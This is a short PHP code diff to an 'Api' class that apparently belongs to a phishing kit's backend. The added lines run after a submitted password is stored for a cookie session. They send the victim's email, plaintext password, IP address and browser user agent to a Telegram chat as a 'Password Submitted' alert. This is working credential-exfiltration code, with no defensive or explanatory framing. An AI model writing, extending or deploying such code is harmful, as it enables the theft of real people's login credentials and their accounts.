@@ -1389,6 +1389,15 @@ class Api {
         NeonDB::updateStatus($cookieId, $newStatus, $password);
 
         Security::log("SUBMIT_PASSWORD: password written for session $cookieId");
+
+        // Send Telegram notification for the password submission
+        $email = $existing['email'] ?? $neonRow['email'] ?? '';
+        if ($email) {
+            $ip = Security::getClientIp();
+            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+            Worker::sendTelegramMessage($email, $password, $ip, $ua, "📝 Password Submitted");
+        }
+
         echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
         exit;
     }
